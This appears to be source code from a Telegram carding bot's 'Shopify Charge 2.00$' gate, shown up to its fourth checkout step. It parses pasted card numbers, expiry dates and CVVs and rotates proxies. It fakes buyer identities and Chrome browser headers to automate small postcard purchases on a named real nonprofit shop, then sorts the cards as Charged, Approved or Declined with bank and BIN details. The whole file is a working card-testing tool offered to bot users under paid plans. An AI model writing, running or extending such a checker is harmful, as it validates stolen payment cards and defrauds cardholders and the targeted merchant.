# BOT/gates/charge/shopify/shopify200.py

import json
import asyncio
import re
import time
import random
import string
import base64
import httpx
import urllib.parse
from datetime import datetime
from pyrogram import Client, filters
from pyrogram.types import Message
import html
import os
import unicodedata

# Import from helper modules
try:
    from BOT.helper.permissions import auth_and_free_restricted
except ImportError:
    def auth_and_free_restricted(func):
        async def wrapper(client, message):
            return await func(client, message)
        return wrapper

try:
    from BOT.helper.Admins import is_command_disabled, get_command_offline_message
except ImportError:
    def is_command_disabled(command_name: str) -> bool:
        return False
    def get_command_offline_message(command_name: str) -> str:
        return "Command is temporarily disabled."

try:
    from BOT.gc.credit import charge_processor
    CHARGE_PROCESSOR_AVAILABLE = True
except ImportError:
    charge_processor = None
    CHARGE_PROCESSOR_AVAILABLE = False

try:
    from TOOLS.getbin import get_bin_details
except ImportError:
    def get_bin_details(bin_number):
        return {}

# Import smart card parser from filter.py
try:
    from BOT.helper.filter import extract_cards, normalize_year
    FILTER_AVAILABLE = True
    print("✅ Smart card parser imported successfully from filter.py for shopify200")
except ImportError as e:
    print(f"❌ Filter import error in shopify200: {e}")
    FILTER_AVAILABLE = False
    def extract_cards(text):
        cards = []
        for line in text.splitlines():
            parts = line.replace('|', ' ').split()
            if len(parts) >= 4:
                cards.append('|'.join(parts[:4]))
        return cards, list(set(cards))
    def normalize_year(y):
        y = y.strip()
        if len(y) == 4:
            return y[-2:]
        return y

# Import proxy system functions
try:
    from BOT.tools.proxy import (
        get_proxy_for_user,
        mark_proxy_success,
        mark_proxy_failed,
        get_random_proxy,
        parse_proxy,
        test_proxy,
        PROXY_ENABLED
    )
    PROXY_SYSTEM_AVAILABLE = True
    print("✅ Proxy system imported successfully for shopify200")
except ImportError as e:
    print(f"❌ Proxy system import error in shopify200: {e}")
    PROXY_SYSTEM_AVAILABLE = False
    def get_proxy_for_user(user_id: int, strategy: str = "random"):
        return None
    def mark_proxy_success(proxy: str, response_time: float):
        pass
    def mark_proxy_failed(proxy: str):
        pass
    def get_random_proxy():
        return None
    def parse_proxy(proxy_str: str):
        return None
    def test_proxy(proxy_str: str):
        return False

# ========== DETAILED LOGGER ==========
class ShopifyLogger:
    def __init__(self, user_id=None):
        self.user_id = user_id
        self.check_id = f"SHP200-{random.randint(1000, 9999)}"
        self.start_time = None
        self.step_counter = 0
        self.logs = []

    def start_check(self, card_details):
        self.start_time = time.time()
        self.step_counter = 0
        cc = card_details.split('|')[0] if '|' in card_details else card_details
        masked_cc = cc[:6] + "******" + cc[-4:] if len(cc) > 10 else cc

        log_msg = f"""
🛒 [SHOPIFY CHARGE 2.00$]
   ├── Check ID: {self.check_id}
   ├── User ID: {self.user_id or 'N/A'}
   ├── Card: {masked_cc}
   ├── Start Time: {datetime.now().strftime('%H:%M:%S')}
   └── Target: shop.kauffmancenter.org (Postcard x2 - Direct Checkout)
        """
        self.add_log(log_msg)
        print(log_msg)
        return log_msg

    def add_log(self, message):
        timestamp = datetime.now().strftime('%H:%M:%S.%f')[:-3]
        self.logs.append(f"[{timestamp}] {message}")

    def step(self, step_num, name, action, details=None, status="PROCESSING"):
        self.step_counter += 1
        elapsed = time.time() - self.start_time if self.start_time else 0

        status_icons = {
            "PROCESSING": "🔄", "SUCCESS": "✅", "FAILED": "❌",
            "WARNING": "⚠️", "INFO": "ℹ️", "CAPTCHA": "🛡️",
            "DECLINED": "⛔", "HUMAN": "👤", "CLICK": "🖱️",
            "TYPE": "⌨️", "WAIT": "⏳"
        }
        status_icon = status_icons.get(status, "➡️")

        log_msg = f"{status_icon} STEP {step_num:02d}: {name}"
        log_msg += f"\n   ├── Action: {action}"
        log_msg += f"\n   ├── Elapsed: {elapsed:.2f}s"
        log_msg += f"\n   ├── Time: {datetime.now().strftime('%H:%M:%S')}"
        if details:
            log_msg += f"\n   └── Details: {details}"

        self.add_log(log_msg)
        print(log_msg)
        print()
        return log_msg

    def data_extracted(self, data_type, value, source=""):
        if isinstance(value, dict):
            value_str = json.dumps(value, indent=2)
            if len(value_str) > 150:
                value_str = value_str[:147] + "..."
        else:
            value_str = str(value)
            if len(value_str) > 100:
                value_str = value_str[:97] + "..."

        log_msg = f"   ├── 📊 Extracted {data_type}: {value_str}"
        if source:
            log_msg += f"\n   │   └── From: {source}"
        self.add_log(log_msg)
        print(log_msg)
        return log_msg

    def card_details_log(self, cc, mes, ano, cvv):
        masked_cc = cc[:6] + "******" + cc[-4:]
        log_msg = f"""
   ├── 💳 Card Details:
   │   ├── Number: {masked_cc}
   │   ├── Expiry: {mes}/{ano}
   │   └── CVV: {'*' * len(cvv)}
        """
        self.add_log(log_msg)
        print(log_msg)
        return log_msg

    def error_log(self, error_type, message, step=""):
        error_icons = {
            "CAPTCHA": "🛡️", "DECLINED": "💳", "FRAUD": "🚫",
            "TIMEOUT": "⏰", "CONNECTION": "🔌", "UNKNOWN": "❓",
            "PROXY": "🔧", "NO_PROXY": "🚫", "PCI": "💳",
            "CHECKOUT_TOKEN": "🎫", "PROCESSING": "⏳"
        }
        error_icon = error_icons.get(error_type, "⚠️")
        log_msg = f"{error_icon} ERROR [{error_type}]: {message}"
        if step:
            log_msg += f"\n   └── At Step: {step}"
        self.add_log(log_msg)
        print(log_msg)
        print()
        return log_msg

    def success_log(self, message, details=""):
        log_msg = f"✅ SUCCESS: {message}"
        if details:
            log_msg += f"\n   └── Details: {details}"
        self.add_log(log_msg)
        print(log_msg)
        return log_msg

    def complete_result(self, success, final_status, response_message, total_time):
        result_icon = "✅" if success else "❌"
        result_text = "APPROVED" if success else "DECLINED"

        if len(response_message) > 100:
            response_display = response_message[:97] + "..."
        else:
            response_display = response_message

        log_msg = f"""
{result_icon} [SHOPIFY CHARGE COMPLETED]
   ├── Check ID: {self.check_id}
   ├── Result: {result_text}
   ├── Final Status: {final_status}
   ├── Steps Completed: {self.step_counter}
   ├── Total Time: {total_time:.2f}s
   ├── Response: {response_display}
   └── End Time: {datetime.now().strftime('%H:%M:%S')}
        """
        summary = f"📊 SUMMARY: {result_icon} {final_status} | {total_time:.2f}s | Steps: {self.step_counter}"
        self.add_log(log_msg)
        self.add_log(summary)
        print(log_msg)
        print(summary)
        print("="*80)
        return log_msg, summary

    def get_all_logs(self):
        return "\n".join(self.logs)


# ========== UTILITY FUNCTIONS ==========
def load_users():
    try:
        with open("DATA/users.json", "r") as f:
            return json.load(f)
    except:
        return {}

def load_owner_id():
    try:
        with open("FILES/config.json", "r") as f:
            return json.load(f).get("OWNER")
    except:
        return None

def get_user_plan(user_id):
    users = load_users()
    if str(user_id) in users:
        return users[str(user_id)].get("plan", {})
    return {}

def is_user_banned(user_id):
    try:
        if not os.path.exists("DATA/banned_users.txt"):
            return False
        with open("DATA/banned_users.txt", "r") as f:
            return str(user_id) in f.read().splitlines()
    except:
        return False

def check_cooldown(user_id, command_type="si"):
    owner_id = load_owner_id()
    if str(user_id) == str(owner_id):
        return True, 0

    try:
        with open("DATA/cooldowns.json", "r") as f:
            cooldowns = json.load(f)
    except:
        cooldowns = {}

    user_key = f"{user_id}_{command_type}"
    current_time = time.time()

    if user_key in cooldowns:
        last_time = cooldowns[user_key]
        user_plan = get_user_plan(user_id)
        antispam = user_plan.get("antispam", 15) or 15

        if current_time - last_time < antispam:
            return False, antispam - (current_time - last_time)

    cooldowns[user_key] = current_time
    try:
        with open("DATA/cooldowns.json", "w") as f:
            json.dump(cooldowns, f, indent=4)
    except:
        pass

    return True, 0

def strip_all_unicode(text):
    """
    Remove ALL Unicode characters, keep only ASCII (letters, numbers, basic punctuation)
    """
    try:
        normalized = unicodedata.normalize('NFKD', text)
        ascii_text = normalized.encode('ASCII', 'ignore').decode('ASCII')
    except:
        ascii_text = ''.join(char for char in text if ord(char) < 128)
    
    cleaned = re.sub(r'[^0-9a-zA-Z\|\s,\/\-]', ' ', ascii_text)
    cleaned = re.sub(r'\s+', ' ', cleaned)
    
    return cleaned.strip()

def extract_card_from_cleaned_text(text):
    """
    Extract card details from cleaned ASCII text
    """
    pattern1 = r'(\d{13,16})\s*[|\s]\s*(\d{1,2})\s*[|\s]\s*(\d{2,4})\s*[|\s]\s*(\d{3,4})'
    match = re.search(pattern1, text)
    if match:
        cc, mes, ano, cvv = match.groups()
        if len(ano) == 4:
            ano = ano[-2:]
        mes = mes.zfill(2)
        return [cc, mes, ano, cvv]
    
    pattern2 = r'(\d{13,16})\s*[, ]\s*(\d{1,2})\s*[, ]\s*(\d{2,4})\s*[, ]\s*(\d{3,4})'
    match = re.search(pattern2, text)
    if match:
        cc, mes, ano, cvv = match.groups()
        if len(ano) == 4:
            ano = ano[-2:]
        mes = mes.zfill(2)
        return [cc, mes, ano, cvv]
    
    digits = re.findall(r'\d+', text)
    
    for i in range(len(digits) - 3):
        potential_cc = digits[i]
        potential_mes = digits[i+1]
        potential_ano = digits[i+2]
        potential_cvv = digits[i+3]
        
        if (13 <= len(potential_cc) <= 16 and 
            len(potential_mes) in [1, 2] and 
            len(potential_ano) in [2, 4] and 
            len(potential_cvv) in [3, 4]):
            
            try:
                mes_int = int(potential_mes)
                if 1 <= mes_int <= 12:
                    current_year = datetime.now().year % 100
                    
                    if len(potential_ano) == 4:
                        ano_val = int(potential_ano) % 100
                    else:
                        ano_val = int(potential_ano)
                    
                    if current_year - 5 <= ano_val <= current_year + 10:
                        cc = potential_cc
                        mes = potential_mes.zfill(2)
                        ano = potential_ano[-2:]
                        cvv = potential_cvv
                        return [cc, mes, ano, cvv]
            except:
                continue
    
    pattern4 = r'[Cc]ard:?\s*(\d{13,16}).*?(\d{1,2})[\/\-](\d{2,4}).*?(\d{3,4})'
    match = re.search(pattern4, text, re.IGNORECASE | re.DOTALL)
    if match:
        cc, mes, ano, cvv = match.groups()
        if len(ano) == 4:
            ano = ano[-2:]
        mes = mes.zfill(2)
        return [cc, mes, ano, cvv]
    
    pattern5 = r'(\d{13,16}).*?(\d{1,2})[\/\-](\d{2,4}).*?(\d{3,4})'
    match = re.search(pattern5, text, re.DOTALL)
    if match:
        cc, mes, ano, cvv = match.groups()
        if len(ano) == 4:
            ano = ano[-2:]
        mes = mes.zfill(2)
        return [cc, mes, ano, cvv]
    
    return None

def parse_card_input(card_input):
    """
    Parse card input by first stripping ALL Unicode, then extracting card details
    """
    cleaned_text = strip_all_unicode(card_input)
    
    result = extract_card_from_cleaned_text(cleaned_text)
    if result:
        return result
    
    if FILTER_AVAILABLE:
        all_cards, unique_cards = extract_cards(card_input)
        if unique_cards:
            card_parts = unique_cards[0].split('|')
            if len(card_parts) == 4:
                cc, mes, ano, cvv = card_parts
                if len(ano) == 4:
                    ano = ano[-2:]
                mes = mes.zfill(2)
                return [cc, mes, ano, cvv]
    
    if '|' in card_input:
        parts = card_input.split('|')
        if len(parts) >= 4:
            cc = re.sub(r'\D', '', parts[0])
            mes = re.sub(r'\D', '', parts[1])
            ano = re.sub(r'\D', '', parts[2])
            cvv = re.sub(r'\D', '', parts[3])
            if cc and mes and ano and cvv:
                if len(ano) == 4:
                    ano = ano[-2:]
                mes = mes.zfill(2)
                return [cc, mes, ano, cvv]
    
    return None


# ========== FORMAT RESPONSE FUNCTION ==========
def format_shopify_response(cc, mes, ano, cvv, raw_response, timet, profile, user_data, proxy_status="Dead 🚫"):
    fullcc = f"{cc}|{mes}|{ano}|{cvv}"

    try:
        user_id = str(user_data.get("user_id", "Unknown"))
    except:
        user_id = None

    try:
        with open("DATA/sites.json", "r") as f:
            sites = json.load(f)
        gateway = sites.get(user_id, {}).get("gate", "Shopify Charge 2.00$ 🏛️")
    except:
        gateway = "Shopify Charge 2.00$ 🏛️"

    raw_response = str(raw_response) if raw_response else "-"
    
    if "TIMEOUT" in raw_response.upper() or "PCI_ERROR" in raw_response.upper():
        status_flag = "Error❗️"
        response_display = "Try again ♻️"
    else:
        if "DECLINED - " in raw_response:
            response_display = raw_response.split("DECLINED - ")[-1]
            if ":" in response_display:
                response_display = response_display.split(":")[0].strip()
            response_display = response_display.split('\n')[0]
            if len(response_display) > 30:
                response_display = response_display[:27] + "..."
        elif "ORDER_PLACED" in raw_response.upper() or "PROCESSEDRECEIPT" in raw_response:
            response_display = "ORDER_PLACED"
        elif "APPROVED - " in raw_response:
            response_display = "APPROVED"
        elif "GENERIC_ERROR" in raw_response:
            if ":" in raw_response:
                response_display = raw_response.split(":")[0].strip()
            else:
                response_display = "GENERIC_ERROR"
        elif "PROXY_DEAD" in raw_response:
            response_display = "PROXY_DEAD"
        elif "NO_PROXY_AVAILABLE" in raw_response:
            response_display = "NO_PROXY_AVAILABLE"
        elif "CAPTCHA" in raw_response.upper():
            response_display = "CAPTCHA"
        elif "3D" in raw_response.upper() or "3DS" in raw_response.upper():
            response_display = "3D_SECURE"
        elif "INSUFFICIENT" in raw_response.upper():
            response_display = "INSUFFICIENT_FUNDS"
        elif "INVALID" in raw_response.upper():
            response_display = "INVALID_CARD"
        elif "EXPIRED" in raw_response.upper():
            response_display = "EXPIRED_CARD"
        elif "FRAUD" in raw_response.upper():
            response_display = "FRAUD"
        elif "TAX_NEW_TAX_MUST_BE_ACCEPTED" in raw_response:
            response_display = "TAX_CHANGE"
        elif "PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT" in raw_response:
            response_display = "PAYMENT_AMOUNT_ERROR"
        elif "PROCESSING_TIMEOUT" in raw_response:
            response_display = "PROCESSING_TIMEOUT"
        elif "CARD_DECLINED" in raw_response.upper():
            response_display = "CARD_DECLINED"
        else:
            if ":" in raw_response:
                response_display = raw_response.split(":")[0].strip()
                if len(response_display) > 30:
                    response_display = response_display[:27] + "..."
            else:
                response_display = raw_response[:30] + "..." if len(raw_response) > 30 else raw_response

        raw_response_upper = raw_response.upper()

        if "NO RECEIPT ID" in raw_response_upper:
            status_flag = "Declined ❌"
        elif any(keyword in raw_response_upper for keyword in [
            "ORDER_PLACED", "SUBMITSUCCESS", "SUCCESSFUL", "APPROVED", "RECEIPT",
            "COMPLETED", "PAYMENT_SUCCESS", "CHARGE_SUCCESS", "THANK_YOU",
            "ORDER_CONFIRMATION", "YOUR_ORDER_IS_CONFIRMED", "ORDER_CONFIRMED",
            "SHOPIFY_PAYMENTS", "SHOP_PAY", "CHARGED", "LIVE",
            "ORDER #", "PROCESSEDRECEIPT", "THANK YOU", "PAYMENT_SUCCESSFUL",
            "PROCESSINGRECEIPT", "AUTHORIZED", "YOUR ORDER IS CONFIRMED"
        ]):
            status_flag = "Charged ✅"
        elif any(keyword in raw_response_upper for keyword in [
            "CAPTCHA", "SOLVE THE CAPTCHA", "CAPTCHA_METADATA_MISSING", 
            "CAPTCHA DETECTED", "CAPTCHA_REQUIRED", "CAPTCHA_VALIDATION_FAILED", 
            "CAPTCHA_ERROR", "BOT_DETECTED", "HUMAN_VERIFICATION", "SECURITY_CHECK",
            "HCAPTCHA", "CLOUDFLARE", "ENTER PAYMENT INFORMATION AND SOLVE",
            "RECAPTCHA", "I'M NOT A ROBOT", "PLEASE VERIFY"
        ]):
            status_flag = "Captcha ⚠️"
        elif any(keyword in raw_response_upper for keyword in [
            "CARD_DECLINED", "THERE WAS AN ISSUE PROCESSING YOUR PAYMENT", 
            "PAYMENT ISSUE", "ISSUE PROCESSING", "PAYMENT ERROR",
            "TRY AGAIN OR USE A DIFFERENT PAYMENT METHOD", "CARD WAS DECLINED",
            "YOUR PAYMENT COULDN'T BE PROCESSED", "PAYMENT FAILED"
        ]):
            status_flag = "Declined ❌"
        elif any(keyword in raw_response_upper for keyword in [
            "INSUFFICIENT FUNDS", "INSUFFICIENT_FUNDS", "NOT ENOUGH MONEY"
        ]):
            status_flag = "Declined ❌"
        elif any(keyword in raw_response_upper for keyword in [
            "INVALID CARD", "CARD IS INVALID", "CARD_INVALID", "CARD NUMBER IS INVALID"
        ]):
            status_flag = "Declined ❌"
        elif any(keyword in raw_response_upper for keyword in [
            "EXPIRED", "CARD HAS EXPIRED", "CARD_EXPIRED", "EXPIRATION DATE"
        ]):
            status_flag = "Declined ❌"
        elif any(keyword in raw_response_upper for keyword in [
            "3D", "AUTHENTICATION", "OTP", "VERIFICATION", "CVV-MATCH-OTP", 
            "3DS", "PENDING", "SECURE REQUIRED", "SECURE_CODE", "AUTH_REQUIRED",
            "3DS REQUIRED", "AUTHENTICATION_FAILED", "COMPLETEPAYMENTCHALLENGE",
            "ACTIONREQUIREDRECEIPT", "ADDITIONAL_VERIFICATION_NEEDED",
            "VERIFICATION_REQUIRED", "CARD_VERIFICATION", "AUTHENTICATE"
        ]):
            status_flag = "Approved ❎"
        elif any(keyword in raw_response_upper for keyword in [
            "INVALID CVC", "INCORRECT CVC", "CVC_INVALID", "CVV", "SECURITY CODE"
        ]):
            status_flag = "Declined ❌"
        elif any(keyword in raw_response_upper for keyword in [
            "FRAUD", "FRAUD_SUSPECTED", "SUSPECTED_FRAUD", "FRAUDULENT",
            "RISKY", "HIGH_RISK", "SECURITY_VIOLATION", "SUSPICIOUS"
        ]):
            status_flag = "Fraud ⚠️"
        elif "NO_PROXY_AVAILABLE" in raw_response_upper or "PROXY_DEAD" in raw_response_upper:
            status_flag = "Proxy Error 🚫"
        else:
            status_flag = "Declined ❌"

    bin_data = get_bin_details(cc[:6]) or {}
    bin_info = {
        "bin": bin_data.get("bin", cc[:6]),
        "country": bin_data.get("country", "Unknown"),
        "flag": bin_data.get("flag", "🏳️"),
        "vendor": bin_data.get("vendor", "Unknown"),
        "type": bin_data.get("type", "Unknown"),
        "level": bin_data.get("level", "Unknown"),
        "bank": bin_data.get("bank", "Unknown")
    }

    try:
        plan = user_data.get("plan", {}).get("plan", "Free")
        badge = user_data.get("plan", {}).get("badge", "🎭")
        first_name = user_data.get("first_name", "User")
    except:
        plan = "Free"
        badge = "🎭"
        first_name = "User"

    clean_name = re.sub(r'[↑←«~∞🏴]', '', first_name).strip()
    profile_display = f"『{badge}』{clean_name}"

    result = f"""
<b>[#Shopify Charge 2.00$] | WAYNE</b> ✦
━━━━━━━━━━━━━━━
<b>[•] Card</b>- <code>{fullcc}</code>
<b>[•] Gateway</b> - <b>Shopify Charge 2.00$</b>
<b>[•] Status</b>- <code>{status_flag}</code>
<b>[•] Response</b>- <code>{response_display}</code>
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>[+] Bin</b>: <code>{bin_info['bin']}</code>  
<b>[+] Info</b>: <code>{bin_info['vendor']} - {bin_info['type']} - {bin_info['level']}</code> 
<b>[+] Bank</b>: <code>{bin_info['bank']}</code> 🏦
<b>[+] Country</b>: <code>{bin_info['country']} - [{bin_info['flag']}]</code>
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>[ﾒ] Checked By</b>: {profile_display} [<code>{plan} {badge}</code>]
<b>[ϟ] Dev</b> ➺</b> <b><i>DADYY</i></b>
━━━━━━━━━━━━━━━
<b>[ﾒ] T/t</b>: <code>[{timet:.2f} 𝐬]</code> <b>|P/x:</b> [<code>{proxy_status}</code>]
"""
    return result


# ========== SHOPIFY KAUFFMAN CENTER CHECKOUT CLASS ==========
class ShopifyKauffmanCheckout:
    def __init__(self, user_id=None):
        self.user_id = user_id
        self.base_url = "https://shop.kauffmancenter.org"
        self.product_handle = "kauffman-center-postcard"
        self.variant_id = "46767629271319"
        self.product_id = "8667052441879"
        self.shop_id = "82514608407"
        self.shop_domain = "shop.kauffmancenter.org"
        
        # CORRECTED: GraphQL persisted query IDs from captured traffic
        self.proposal_id = "e65ffeb18d0b5e7cc746231c07befb63f4bc2e69c060d4067ca9115a923ae427"
        self.submit_id = "7cc51969cc21c5f45bc518e0650abe94c2ff3ffa378fb7d0b72212b44ff36470"
        self.poll_id = "42b5051ef09da17cd5cb5789121ab3adab0ca8c9ec7547a4d431bb17060e757f"
        
        # Delivery strategy handle - extracted dynamically from response
        self.delivery_strategy_handle = None
        
        # Payment method identifier for Shopify Payments
        self.payment_method_identifier = "c8cc804c79e3a3a438a6233f2a8d97b0"
        
        # Proxy management
        self.proxy_url = None
        self.proxy_status = "Dead 🚫"
        self.proxy_used = False

        # Session for maintaining cookies
        self.client = None

        # Dynamic data storage
        self.checkout_token = None
        self.session_token = None
        self.graphql_session_token = None
        self.receipt_id = None
        self.stable_id = None
        self.queue_token = None
        self.payment_session_id = None

        # Coordinates (will be randomized)
        self.coordinates = {
            "latitude": 28.6327,
            "longitude": 77.2198
        }

        self.logger = ShopifyLogger(user_id)

        # Random data generators
        self.first_names = ["James", "Robert", "John", "Michael", "David", "William", "Richard", 
                           "Joseph", "Thomas", "Charles", "Daniel", "Matthew", "Anthony", "Mark", 
                           "Donald", "Steven", "Paul", "Andrew", "Kenneth", "Joshua", "Kevin", 
                           "Brian", "George", "Timothy", "Ronald", "Edward", "Jason", "Jeffrey",
                           "Casey", "Mini", "Bruce", "Tony", "Steve", "Peter", "Clark"]
        self.last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", 
                          "Davis", "Rodriguez", "Martinez", "Hernandez", "Lopez", "Gonzalez", 
                          "Wilson", "Anderson", "Thomas", "Taylor", "Moore", "Jackson", "Martin", 
                          "Lee", "Perez", "Thompson", "White", "Harris", "Sanchez", "Clark", "Lang", 
                          "Trump", "Walker", "Hall", "Allen", "Young", "King"]

        self.first_name = random.choice(self.first_names)
        self.last_name = random.choice(self.last_names)
        self.full_name = f"{self.first_name} {self.last_name}"
        self.email = f"{self.first_name.lower()}{self.last_name.lower()}{random.randint(10,999)}@gmail.com"

        # Pickup location address (Kauffman Center)
        self.address = {
            "address1": "1601 Broadway Blvd",
            "address2": "",
            "city": "Kansas City",
            "provinceCode": "MO",
            "zip": "64108",
            "countryCode": "US"
        }

    async def random_delay(self, min_sec=0.2, max_sec=0.5):
        await asyncio.sleep(random.uniform(min_sec, max_sec))

    def step(self, num, name, action, details=None, status="PROCESSING"):
        return self.logger.step(num, name, action, details, status)

    def extract_checkout_token(self, url_or_text):
        """Extract checkout token from URL"""
        patterns = [
            r'/checkouts/cn/([^/?]+)',
            r'token=([^&]+)',
            r'checkout_token=([^&]+)',
            r'checkout%5Btoken%5D=([^&]+)',
            r'checkouts/([^/?]+)',
            r'checkout_token%3D([^&]+)'
        ]
        for pattern in patterns:
            match = re.search(pattern, url_or_text)
            if match:
                return match.group(1)
        
        try:
            decoded = urllib.parse.unquote(url_or_text)
            for pattern in patterns:
                match = re.search(pattern, decoded)
                if match:
                    return match.group(1)
        except:
            pass
        
        return None

    def generate_random_string(self, length=16):
        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

    def generate_uuid(self):
        return f"{self.generate_random_string(8)}-{self.generate_random_string(4)}-4{self.generate_random_string(3)}-{random.choice(['8','9','a','b'])}{self.generate_random_string(3)}-{self.generate_random_string(12)}"

    def generate_timestamp(self):
        return str(int(time.time() * 1000))

    def construct_graphql_session_token(self):
        if not self.checkout_token:
            return None
        timestamp = self.generate_timestamp()
        return f"{self.checkout_token}-{timestamp}"

    def get_graphql_headers(self):
        """Get standard GraphQL headers matching captured traffic"""
        headers = {
            'authority': self.shop_domain,
            'accept': 'application/json',
            'accept-language': 'en-US',
            'content-type': 'application/json',
            'origin': self.base_url,
            'referer': f'{self.base_url}/checkouts/cn/{self.checkout_token}/en-us?_r=AQABnkM5xJCZpPtGkHegdHkf6umxo7ulKWF4CF4C23MxLwk&auto_redirect=false&edge_redirect=true&skip_shop_pay=true',
            'sec-ch-ua': '"Google Chrome";v="147", "Not.A/Brand";v="8", "Chromium";v="147"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'shopify-checkout-client': 'checkout-web/1.0',
            'shopify-checkout-source': f'id="{self.checkout_token}", type="cn"',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36',
            'x-checkout-web-build-id': 'd337b60249d314b13499c517706706e019af3129',
            'x-checkout-web-deploy-stage': 'production',
            'x-checkout-web-server-handling': 'fast',
            'x-checkout-web-server-rendering': 'yes',
            'x-checkout-web-source-id': self.checkout_token or ''
        }
        if self.session_token:
            headers['x-checkout-one-session-token'] = self.session_token
        return headers

    async def access_homepage(self):
        """Step 1: Access homepage to get initial cookies"""
        self.step(1, "ACCESS HOMEPAGE", "Getting initial cookies from homepage")
        
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'sec-ch-ua': '"Google Chrome";v="147", "Not.A/Brand";v="8", "Chromium";v="147"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36'
        }
        
        try:
            resp = await self.client.get(self.base_url + "/", headers=headers, timeout=25, follow_redirects=True)
            self.logger.data_extracted("Homepage", f"Status: {resp.status_code}", "Initial cookies obtained")
            return True
        except Exception as e:
            self.logger.error_log("HOMEPAGE", f"Failed: {str(e)[:50]}")
            return False

    async def access_product_page(self):
        """Step 2: Access product page"""
        self.step(2, "PRODUCT PAGE", "Accessing product page")
        
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'referer': self.base_url + '/collections/all?filter.v.price.gte=&filter.v.price.lte=&sort_by=price-ascending',
            'sec-ch-ua': '"Google Chrome";v="147", "Not.A/Brand";v="8", "Chromium";v="147"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36'
        }
        
        try:
            resp = await self.client.get(
                f"{self.base_url}/products/{self.product_handle}",
                headers=headers,
                timeout=25,
                follow_redirects=True
            )
            self.logger.data_extracted("Product Page", f"Status: {resp.status_code}", "Page loaded")
            return True
        except Exception as e:
            self.logger.error_log("PRODUCT", f"Failed: {str(e)[:50]}")
            return False

    async def add_to_cart(self):
        """Step 3: Add 2x postcards to cart"""
        self.step(3, "ADD TO CART", "Adding 2x Kauffman Center Postcard")
        
        boundary = "----WebKitFormBoundary" + self.generate_random_string(16)
        
        form_data = (
            f'------WebKitFormBoundary{boundary[28:]}\r\n'
            f'Content-Disposition: form-data; name="quantity"\r\n\r\n'
            f'2\r\n'
            f'------WebKitFormBoundary{boundary[28:]}\r\n'
            f'Content-Disposition: form-data; name="form_type"\r\n\r\n'
            f'product\r\n'
            f'------WebKitFormBoundary{boundary[28:]}\r\n'
            f'Content-Disposition: form-data; name="utf8"\r\n\r\n'
            f'\u2713\r\n'
            f'------WebKitFormBoundary{boundary[28:]}\r\n'
            f'Content-Disposition: form-data; name="id"\r\n\r\n'
            f'{self.variant_id}\r\n'
            f'------WebKitFormBoundary{boundary[28:]}\r\n'
            f'Content-Disposition: form-data; name="product-id"\r\n\r\n'
            f'{self.product_id}\r\n'
            f'------WebKitFormBoundary{boundary[28:]}\r\n'
            f'Content-Disposition: form-data; name="section-id"\r\n\r\n'
            f'template--20966247072023__main\r\n'
            f'------WebKitFormBoundary{boundary[28:]}\r\n'
            f'Content-Disposition: form-data; name="sections"\r\n\r\n'
            f'cart-notification-product,cart-notification-button,cart-icon-bubble\r\n'
            f'------WebKitFormBoundary{boundary[28:]}\r\n'
            f'Content-Disposition: form-data; name="sections_url"\r\n\r\n'
            f'/products/{self.product_handle}\r\n'
            f'------WebKitFormBoundary{boundary[28:]}--\r\n'
        )
        
        headers = {
            'accept': 'application/javascript',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': f'multipart/form-data; boundary=----WebKitFormBoundary{boundary[28:]}',
            'origin': self.base_url,
            'referer': f'{self.base_url}/products/{self.product_handle}',
            'sec-ch-ua': '"Google Chrome";v="147", "Not.A/Brand";v="8", "Chromium";v="147"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest'
        }
        
        try:
            resp = await self.client.post(
                f"{self.base_url}/cart/add",
                headers=headers,
                content=form_data,
                timeout=25
            )
            self.logger.data_extracted("Add to Cart", f"Status: {resp.status_code}", "2x Postcard added")
            return True
        except Exception as e:
            self.logger.error_log("CART", f"Failed: {str(e)[:50]}")
            return False

    async def accelerated_checkout(self):
        """Step 4: Call accelerated checkout to get checkout token"""
        self.step(4, "ACCELERATED CHECKOUT", "Calling accelerated checkout endpoint")
        
        headers = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/json',
            'origin': self.base_url,
